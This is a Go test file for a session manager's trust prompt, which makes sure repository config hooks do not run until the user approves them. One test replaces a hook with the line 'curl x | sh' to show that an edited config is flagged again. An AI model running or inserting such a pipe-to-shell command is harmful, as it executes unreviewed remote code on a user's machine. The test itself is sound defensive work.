package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jskoll/wyrm/internal/trust"
)

// requireTrust turns the trust prompt back on for one test (TestMain turns it
// off for everything else), with a fresh, empty trust store.
func requireTrust(t *testing.T) {
	t.Helper()
	t.Setenv(trust.EnvTrustAll, "")
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
}

const hookedConfig = "[session]\nname = \"proj\"\nroot = \".\"\non_project_start = \"echo hi\"\n[[windows]]\nname = \"w\"\n"

func writeRepoConfig(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ".wyrm.toml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	chdir(t, dir)
	return dir
}

func newSessions(r *fakeRunner) int {
	n := 0
	for _, c := range r.calls {
		if c[0] == "new-session" {
			n++
		}
	}
	return n
}

func TestUpAsksBeforeRunningUntrustedConfig(t *testing.T) {
	requireTrust(t)
	writeRepoConfig(t, hookedConfig)

	r := &fakeRunner{}
	var stdout, stderr bytes.Buffer
	code := runWith(withStdin("n\n"), []string{"up", "-d"}, &stdout, &stderr, r, func() bool { return false }, nil)
	if code != 1 {
		t.Fatalf("declined: exit %d, stderr %q", code, stderr.String())
	}
	if !strings.Contains(stderr.String(), "on_project_start = echo hi") || !strings.Contains(stderr.String(), "not trusted yet") {
		t.Errorf("stderr = %q", stderr.String())
	}
	if newSessions(r) != 0 {
		t.Error("declining built the session")
	}

	// Saying yes builds it and remembers the decision.
	stdout.Reset()
	stderr.Reset()
	if code := runWith(withStdin("y\n"), []string{"up", "-d"}, &stdout, &stderr, r, func() bool { return false }, nil); code != 0 {
		t.Fatalf("accepted: exit %d, stderr %q", code, stderr.String())
	}
	if newSessions(r) != 1 {
		t.Error("accepting did not build the session")
	}
	r2 := &fakeRunner{}
	stderr.Reset()
	if code := runWith(withStdin(""), []string{"up", "-d"}, &stdout, &stderr, r2, func() bool { return false }, nil); code != 0 {
		t.Fatalf("trusted: exit %d, stderr %q", code, stderr.String())
	}
	if strings.Contains(stderr.String(), "not trusted") {
		t.Errorf("asked again for a trusted config: %q", stderr.String())
	}
}

func TestEditedConfigIsAskedAboutAgain(t *testing.T) {
	requireTrust(t)
	dir := writeRepoConfig(t, hookedConfig)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"allow"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil); code != 0 {
		t.Fatalf("allow: %d %q", code, stderr.String())
	}
	if err := os.WriteFile(filepath.Join(dir, ".wyrm.toml"), []byte(strings.Replace(hookedConfig, "echo hi", "curl x | sh", 1)), 0o644); err != nil {
		t.Fatal(err)
	}
	r := &fakeRunner{}
	stderr.Reset()
	code := runWith(withStdin(""), []string{"up", "-d"}, &stdout, &stderr, r, func() bool { return false }, nil)
	if code != 1 || !strings.Contains(stderr.String(), "has changed since you trusted it") {
		t.Fatalf("exit %d, stderr %q", code, stderr.String())
	}
	if newSessions(r) != 0 {
		t.Error("an edited config ran without asking")
	}
}

func TestDenyRefusesWithoutAsking(t *testing.T) {
	requireTrust(t)
	writeRepoConfig(t, hookedConfig)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"deny"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil); code != 0 {
		t.Fatalf("deny: %d %q", code, stderr.String())
	}
	stderr.Reset()
	code := runWith(withStdin("y\n"), []string{"up", "-d"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil)
	if code != 1 || !strings.Contains(stderr.String(), "you denied") || strings.Contains(stdout.String(), "Trust this config") {
		t.Fatalf("exit %d, stdout %q, stderr %q", code, stdout.String(), stderr.String())
	}
	stdout.Reset()
	if code := run([]string{"allow", "-list"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil); code != 0 {
		t.Fatal(code)
	}
	if !strings.Contains(stdout.String(), "denied") {
		t.Errorf("allow -list = %q", stdout.String())
	}
}

func TestCommandFreeConfigNeedsNoTrust(t *testing.T) {
	requireTrust(t)
	writeRepoConfig(t, "[session]\nname = \"proj\"\nroot = \".\"\n[[windows]]\nname = \"w\"\n")
	var stdout, stderr bytes.Buffer
	if code := runWith(withStdin(""), []string{"up", "-d"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil); code != 0 {
		t.Fatalf("exit %d, stderr %q", code, stderr.String())
	}
}

func TestKillUntrustedSkipsHooksButKills(t *testing.T) {
	requireTrust(t)
	writeRepoConfig(t, strings.Replace(hookedConfig, "on_project_start", "on_project_exit", 1))
	r := &fakeRunner{listOutput: "$1|proj"}
	var stdout, stderr bytes.Buffer
	code := runWith(withStdin("n\n"), []string{"kill"}, &stdout, &stderr, r, func() bool { return false }, nil)
	if code != 0 {
		t.Fatalf("exit %d, stderr %q", code, stderr.String())
	}
	if strings.Contains(stderr.String(), "running on_project_exit") {
		t.Errorf("ran the untrusted hook: %q", stderr.String())
	}
	if !strings.Contains(stderr.String(), "without its hooks") || !strings.Contains(stdout.String(), "killed session proj") {
		t.Errorf("stdout %q, stderr %q", stdout.String(), stderr.String())
	}
}

func TestDryRunNeedsNoTrust(t *testing.T) {
	requireTrust(t)
	writeRepoConfig(t, hookedConfig)
	var stdout, stderr bytes.Buffer
	if code := runWith(withStdin(""), []string{"up", "-n"}, &stdout, &stderr, &fakeRunner{}, func() bool { return false }, nil); code != 0 {
		t.Fatalf("exit %d, stderr %q", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "# would run on_project_start") {
		t.Errorf("stdout = %q", stdout.String())
	}
}
